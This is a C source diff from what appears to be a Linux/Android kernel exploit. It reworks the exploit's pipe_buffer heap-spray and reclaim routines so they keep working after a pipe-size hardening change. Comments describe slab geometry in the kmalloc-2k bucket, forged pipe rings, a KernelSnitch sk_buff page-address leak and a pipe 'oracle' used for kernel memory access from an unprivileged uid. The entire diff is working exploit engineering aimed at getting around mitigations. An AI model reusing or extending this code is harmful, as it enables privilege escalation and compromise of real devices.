@@ -88,17 +88,148 @@ void init_ctx(struct mm_ctx *ctx, size_t cnt) {
   ctx->memfds = calloc(sizeof(int), cnt);
 }
 
-void resize_pipe_slots(int pipefd[2], size_t slots) {
-  SYSCHK(fcntl(pipefd[0], F_SETPIPE_SZ, slots * PAGE_SIZE));
+static void pipe_child_release_ctx(struct mm_ctx *prep, struct mm_ctx *spray,
+                                   struct mm_ctx *pre, struct mm_ctx *post,
+                                   void *buf) {
+  close_ctx_memfds(prep);
+  close_ctx_memfds(spray);
+  close_ctx_memfds(pre);
+  close_ctx_memfds(post);
+  free_ctx_storage(prep);
+  free_ctx_storage(spray);
+  free_ctx_storage(pre);
+  free_ctx_storage(post);
+  free(buf);
 }
 
-void make_pipe_object(int pipefd[2]) {
-  SYSCHK(pipe(pipefd));
-  resize_pipe_slots(pipefd, 2);
+/* fs/pipe-max-size / per-user pipe budget hardening (CZDE fixwave 2026-10):
+ * F_SETPIPE_SZ above the sysctl (or past the per-user soft page budget)
+ * fails EPERM for uid 2000 (CapEff=0). The old path discarded the SYSCHK
+ * return, left the ring at its 2-slot boot size, and chained two failure
+ * shapes: (1) reclaim geometry silently collapsed (the 0x28-byte arrays
+ * never resized into the kmalloc-2k bucket slab the oracle expects) and
+ * (2) worse, SYSCHK's pr_error fired INSIDE the forked prepare child —
+ * pr_error is exit(-1), the exit-path fork-hold then inherited
+ * result_pipe[1], and the parent blocked on read() forever (the observed
+ * "SYSCHK(...): Operation not permitted" then hang-until-p0-timeout).
+ * Rules now: cap the request to /proc/sys/fs/pipe-max-size when readable,
+ * else retry at the geometry floor on EPERM, and hand failures back to
+ * callers (warning text only — no exit inside the prepare child) so the
+ * attempt fails fast through the leak-failure return path. The floor keeps
+ * the pipe_buffer ARRAY inside the kmalloc-2k bucket (26..51 slots x 0x28
+ * B): all slab-shaping geometry (PIPE_OBJECT_SIZE / PIPE_OBJS_PER_SLAB /
+ * ORDER3_SIZE) is bucket-size derived and untouched; only the per-pipe
+ * data-page canvas shrinks (32 -> 26 pages). */
+#ifndef P0_PIPE_RING_MIN_SLOTS
+#define P0_PIPE_RING_MIN_SLOTS 26
+#endif
+_Static_assert(sizeof(struct user_pipe_buffer) * P0_PIPE_RING_MIN_SLOTS > 1024 &&
+                   sizeof(struct user_pipe_buffer) * PIPE_BUFFER_SLOTS <= 2048,
+               "pipe ring window must stay in the kmalloc-2k bucket");
+
+static int pipe_ring_limit_read;
+static size_t pipe_ring_limit_slots;
+static size_t pipe_ring_effective_slots = PIPE_BUFFER_SLOTS;
+
+static size_t pipe_sysctl_max_slots(void) {
+  char buf[32];
+  ssize_t got;
+  unsigned long long value;
+  int fd;
+
+  if (pipe_ring_limit_read) {
+    return pipe_ring_limit_slots;
+  }
+  pipe_ring_limit_read = 1;
+  pipe_ring_limit_slots = 0;
+  fd = open("/proc/sys/fs/pipe-max-size", O_RDONLY | O_CLOEXEC);
+  if (fd < 0) {
+    pr_warning("fs/pipe-max-size unreadable errno=%d; resize caps apply "
+               "after EPERM only\n", errno);
+    return 0;
+  }
+  got = read(fd, buf, sizeof(buf) - 1);
+  close(fd);
+  if (got <= 0) {
+    return 0;
+  }
+  buf[got] = 0;
+  value = strtoull(buf, NULL, 10);
+  if (!value || value == UINT64_MAX) {
+    return 0;
+  }
+  pipe_ring_limit_slots = (size_t)value / PAGE_SIZE;
+  pr_info("fs/pipe-max-size=%llu max_slots=%zu\n", value,
+          pipe_ring_limit_slots);
+  return pipe_ring_limit_slots;
 }
 
-void alloc_pipe_object(int pipefd[2]) {
-  resize_pipe_slots(pipefd, PIPE_BUFFER_SLOTS);
+int resize_pipe_slots(int pipefd[2], size_t slots) {
+  size_t want = slots;
+  size_t limit;
+  int saved_errno;
+
+  for (;;) {
+    errno = 0;
+    if (fcntl(pipefd[0], F_SETPIPE_SZ, (long)(want * PAGE_SIZE)) >= 0) {
+      return 0;
+    }
+    saved_errno = errno;
+    if (saved_errno != EPERM || want <= P0_PIPE_RING_MIN_SLOTS) {
+      pr_warning("pipe ring resize failed want=%zu bytes=%zu errno=%d\n",
+                 want, want * PAGE_SIZE, saved_errno);
+      return -1;
+    }
+    limit = pipe_sysctl_max_slots();
+    if (limit && limit < want && limit >= P0_PIPE_RING_MIN_SLOTS) {
+      pr_warning("pipe ring resize capped %zu->%zu fs/pipe-max-size\n",
+                 want, limit);
+      want = limit;
+      continue;
+    }
+    pr_warning("pipe ring resize capped %zu->%zu (per-user pipe budget or "
+               "sysctl)\n", want, (size_t)P0_PIPE_RING_MIN_SLOTS);
+    want = P0_PIPE_RING_MIN_SLOTS;
+  }
+}
+
+int make_pipe_object(int pipefd[2]) {
+  if (pipe(pipefd) != 0) {
+    int saved_errno = errno;
+    pr_warning("pipe create failed errno=%d\n", saved_errno);
+    pipefd[0] = -1;
+    pipefd[1] = -1;
+    return -1;
+  }
+  return resize_pipe_slots(pipefd, 2);
+}
+
+int alloc_pipe_object(int pipefd[2]) {
+  size_t want = PIPE_BUFFER_SLOTS;
+  size_t limit;
+  long ring;
+
+  limit = pipe_sysctl_max_slots();
+  if (limit && limit < want) {
+    if (limit < P0_PIPE_RING_MIN_SLOTS) {
+      pr_warning("pipe ring geometry impossible: fs/pipe-max-size slots=%zu "
+                 "below floor %zu\n", limit,
+                 (size_t)P0_PIPE_RING_MIN_SLOTS);
+      return -1;
+    }
+    want = limit;
+  }
+  if (resize_pipe_slots(pipefd, want) != 0) {
+    return -1;
+  }
+  ring = fcntl(pipefd[0], F_GETPIPE_SZ);
+  if (ring > 0) {
+    size_t ring_slots = (size_t)ring / PAGE_SIZE;
+    if (ring_slots && ring_slots < pipe_ring_effective_slots) {
+      pipe_ring_effective_slots = ring_slots;
+    }
+  }
+  return 0;
 }
 
 void free_pipe_object(int pipefd[2]) {
@@ -205,15 +336,7 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   uintptr_t leaked = cleanup_kernelsnitch();
   if (leaked == (uintptr_t)-1) {
     pr_warning("pipe KernelSnitch sk_buff page leak failed\n");
-    close_ctx_memfds(&prep);
-    close_ctx_memfds(&spray);
-    close_ctx_memfds(&pre);
-    close_ctx_memfds(&post);
-    free_ctx_storage(&prep);
-    free_ctx_storage(&spray);
-    free_ctx_storage(&pre);
-    free_ctx_storage(&post);
-    free(buf);
+    pipe_child_release_ctx(&prep, &spray, &pre, &post, buf);
     return 0;
   }
   uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
@@ -227,25 +350,29 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
 #endif
 
   for (size_t i = 0; i < PIPE_DRAIN; i++) {
-    alloc_pipe_object(pipe_fds_drain[i]);
+    if (alloc_pipe_object(pipe_fds_drain[i]) != 0) {
+      /* no pr_error here: it is exit(-1), and an exit inside this prepare
+       * child leaves the fork-hold holding result_pipe[1] so the parent
+       * blocks on read() until the attempt timeout — warning + the same
+       * early-return the failed-leak path uses instead */
+      pr_warning("p0 pipe ring alloc failed drain=%zu\n", i);
+      pipe_child_release_ctx(&prep, &spray, &pre, &post, buf);
+      return 0;
+    }
   }
 
   pin_to_core(CORE);
   SYSCHK(close(skb_sv[0]));
   SYSCHK(close(skb_sv[1]));
   for (size_t i = 0; i < PIPE_RECLAIM; i++) {
-    alloc_pipe_object(pipe_fds_reclaim[i]);
+    if (alloc_pipe_object(pipe_fds_reclaim[i]) != 0) {
+      pr_warning("p0 pipe ring alloc failed reclaim=%zu\n", i);
+      pipe_child_release_ctx(&prep, &spray, &pre, &post, buf);
+      return 0;
+    }
   }
 
-  close_ctx_memfds(&prep);
-  close_ctx_memfds(&spray);
-  close_ctx_memfds(&pre);
-  close_ctx_memfds(&post);
-  free_ctx_storage(&prep);
-  free_ctx_storage(&spray);
-  free_ctx_storage(&pre);
-  free_ctx_storage(&post);
-  free(buf);
+  pipe_child_release_ctx(&prep, &spray, &pre, &post, buf);
   return base;
 }
 
@@ -372,15 +499,41 @@ void pipe_exit_note_holder(void) {
   pipe_exit_hold_spawned = 1;
 }
 
+/* teardown for pipes made before a failed make/resize — only entries
+ * actually created get closed (fresh arrays are zero- and not -1-filled) */
+static void pipe_close_unready_objects(size_t drain_ready,
+                                       size_t reclaim_ready) {
+  for (size_t i = 0; i < drain_ready; i++) {
+    close(pipe_fds_drain[i][0]);
+    close(pipe_fds_drain[i][1]);
+    pipe_fds_drain[i][0] = -1;
+    pipe_fds_drain[i][1] = -1;
+  }
+  for (size_t i = 0; i < reclaim_ready; i++) {
+    close(pipe_fds_reclaim[i][0]);
+    close(pipe_fds_reclaim[i][1]);
+    pipe_fds_reclaim[i][0] = -1;
+    pipe_fds_reclaim[i][1] = -1;
+  }
+}
+
 uintptr_t prepare_pipe_buffer_page(void) {
   /* forged rings can exist from here on — arm the exit protection before
    * the first pipe object is created */
   pipe_exit_protect_install();
   for (size_t i = 0; i < PIPE_DRAIN; i++) {
-    make_pipe_object(pipe_fds_drain[i]);
+    if (make_pipe_object(pipe_fds_drain[i]) != 0) {
+      pr_warning("p0 pipe object make failed drain=%zu\n", i);
+      pipe_close_unready_objects(i + 1, 0);
+      return 0;
+    }
   }
   for (size_t i = 0; i < PIPE_RECLAIM; i++) {
-    make_pipe_object(pipe_fds_reclaim[i]);
+    if (make_pipe_object(pipe_fds_reclaim[i]) != 0) {
+      pr_warning("p0 pipe object make failed reclaim=%zu\n", i);
+      pipe_close_unready_objects(PIPE_DRAIN, i + 1);
+      return 0;
+    }
   }
   pipe_objects_ready = 1;
 
@@ -431,6 +584,7 @@ void reset_pipe_attempt(void) {
   pipe_forge_ring_base = 0;
   pipe_forge_slot_addr = 0;
   pipe_forge_slot_dirty = 0;
+  pipe_ring_effective_slots = PIPE_BUFFER_SLOTS;
   if (pipe_prepare_child > 0) {
     kill(pipe_prepare_child, SIGKILL);
     waitpid(pipe_prepare_child, NULL, 0);
@@ -1052,7 +1206,13 @@ static int pipe_read_full(int fd, void *data, size_t size) {
 static int pipe_duplicate_bytes(
     int source_fd, int holder[2], size_t size, size_t slots) {
   SYSCHK(pipe(holder));
-  resize_pipe_slots(holder, slots);
+  if (resize_pipe_slots(holder, slots) != 0) {
+    close(holder[0]);
+    close(holder[1]);
+    holder[0] = -1;
+    holder[1] = -1;
+    return 0;
+  }
   errno = 0;
   ssize_t duplicated = syscall(SYS_tee, source_fd, holder[1], size, 0);
   return duplicated == (ssize_t)size;
@@ -1211,8 +1371,9 @@ int prepare_p0_pipe_oracle(void) {
       return 0;
     }
   }
-  pr_info("p0 pipe oracle prepared base=%016zx pipes=%d gate_slots=1\n",
-          pipebuf_page_base, PIPE_RECLAIM);
+  pr_info("p0 pipe oracle prepared base=%016zx pipes=%d ring_slots=%d "
+          "gate_slots=1\n",
+          pipebuf_page_base, PIPE_RECLAIM, (int)pipe_ring_effective_slots);
   return 1;
 }
 
@@ -1221,7 +1382,10 @@ int expand_p0_pipe_oracle(void) {
   memset(marker, 0x5a, sizeof(marker));
   memcpy(marker, "RMG-P0-PIPE", 11);
   for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
-    for (size_t slot = 1; slot < PIPE_BUFFER_SLOTS; slot++) {
+    long ring = fcntl(pipe_fds_reclaim[pipe_index][0], F_GETPIPE_SZ);
+    size_t ring_slots =
+        ring > 0 ? (size_t)ring / PAGE_SIZE : pipe_ring_effective_slots;
+    for (size_t slot = 1; slot < ring_slots; slot++) {
       if (!pipe_write_full(pipe_fds_reclaim[pipe_index][1], marker,
                            sizeof(marker))) {
         return 0;
@@ -1229,7 +1393,7 @@ int expand_p0_pipe_oracle(void) {
     }
   }
   pr_info("p0 pipe oracle expanded pipes=%d slots=%d\n",
-          PIPE_RECLAIM, PIPE_BUFFER_SLOTS);
+          PIPE_RECLAIM, (int)pipe_ring_effective_slots);
   return 1;
 }
 
